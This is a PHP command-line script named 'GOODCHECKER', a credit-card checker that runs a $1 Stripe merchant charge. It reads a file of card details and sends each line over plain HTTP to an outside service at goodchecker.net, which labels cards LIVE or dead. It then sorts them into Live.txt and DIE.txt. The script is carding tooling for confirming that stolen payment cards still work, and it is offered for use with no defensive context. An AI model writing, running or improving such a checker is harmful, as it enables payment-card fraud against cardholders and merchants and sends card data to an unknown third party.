<?php
echo "Hai, Welcome To GOODCHECKER Trial Version\n";
echo "CC checker Merchant Stripe Charge $1\n";
echo "Note: Supported Card Visa, Mastercard, AMEX, Discover Card\n\n";
  do {
    $pathFile = input("Path File List");
    if(empty($pathFile)) {
    $initiateRepeat = 1;
      } else if(!file_exists($pathFile)) {
        $initiateRepeat = 1;
      } else {
        $initiateRepeat = 0;
      }
    } while($initiateRepeat);
    
    
$delimeter = explode("\n", trim(file_get_contents($pathFile)));
$checkTotal = 0;
$amountList = count($delimeter);
    
  foreach($delimeter as $format) {
  $format = trim($format);
  $response = file_get_contents("http://goodchecker.net/ccn2/api.php?list=".trim($format));
    if($response == "LIVE") {
      echo "[".$checkTotal."/".$amountList."] ".$response."\n";
      file_put_contents("Live.txt", $response."\n", FILE_APPEND);
      } else {
        echo "[".$checkTotal."/".$amountList."] ".$response."\n";
        file_put_contents("DIE.txt", $format."\n", FILE_APPEND);
      }
        $checkTotal++;
    }
    
    function input($text) {
      echo $text.": ";
      $a = trim(fgets(STDIN));
      return $a;
    }
?>
